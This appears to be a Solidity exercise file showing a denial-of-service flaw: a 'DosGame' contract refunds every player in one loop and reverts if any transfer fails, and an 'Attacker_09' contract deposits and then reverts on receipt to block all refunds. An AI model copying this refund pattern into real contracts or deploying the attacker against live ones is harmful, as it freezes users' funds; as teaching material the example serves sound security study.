// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract DosGame {
  error RefundAlreadyFinished();
  error InsufficientValue();
  error RefundFailed();

  mapping(address => uint256) public balanceOf;
  address[] public players;
  bool private _isRefundFinished;

  function deposit() public payable {
    if (_isRefundFinished) revert RefundAlreadyFinished();
    if (msg.value == 0) revert InsufficientValue();
    balanceOf[msg.sender] = msg.value;
    players.push(msg.sender);
  }

  function refund() public {
    if (_isRefundFinished) revert RefundAlreadyFinished();
    uint256 length = players.length;
    for (uint256 i = 0; i < length; i += 1) {
      address player = players[i];
      uint256 amount = balanceOf[player];
      balanceOf[player] = 0;
      (bool success,) = player.call{value : amount}("");
      if (!success) revert RefundFailed();
    }
    _isRefundFinished = true;
  }
}

contract Attacker_09 {
  error DosGameAttacked();

  DosGame private _dosGame;

  constructor(address gameAddress) {
    _dosGame = DosGame(gameAddress);
  }

  function attack() public payable {
    _dosGame.deposit{value : msg.value}();
  }

  receive() external payable {
    revert DosGameAttacked();
  }
}